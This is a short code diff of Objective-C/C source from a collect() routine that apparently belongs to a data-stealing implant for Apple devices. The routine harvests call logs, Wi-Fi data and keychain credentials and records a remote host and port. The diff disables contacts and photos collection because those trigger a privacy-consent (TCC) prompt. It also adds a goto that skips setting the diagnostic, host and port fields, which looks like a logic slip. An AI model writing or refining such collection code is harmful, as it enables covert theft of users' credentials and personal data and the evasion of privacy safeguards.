@@ -633,8 +633,8 @@ int collect(void *ctx) {
         NSMutableDictionary *summary = [NSMutableDictionary dictionary];
         int n;
 
-        n = collectContacts();
-        if (n > 0) { summary[@"contacts"] = @(n); diag |= 8; }
+        /* Contacts needs a TCC prompt that can never be answered here -> skipped */
+        /* n = collectContacts(); */
 
         n = collectCalls();
         if (n > 0) { summary[@"calls"] = @(n); diag |= 16; }
@@ -645,16 +645,19 @@ int collect(void *ctx) {
         n = collectWiFi();
         if (n > 0) { summary[@"wifi"] = @(n); diag |= 64; }
 
-        n = collectPhotos();
-        if (n > 0) { summary[@"photos"] = @(n); diag |= 128; }
+        /* Photos also needs TCC -> skipped */
+        /* n = collectPhotos(); */
 
         n = collectKeychain();
         if (n > 0) { summary[@"keychain"] = @(n); diag |= 256; }
+        goto done_collecting;
+
 
         summary[@"diag"] = @(diag);
         summary[@"host"] = [NSString stringWithUTF8String:g_host];
         summary[@"port"] = @(g_port);
 
+        done_collecting:
         g_outstg = 2;
         {
             NSMutableDictionary *pkg = [NSMutableDictionary dictionary];
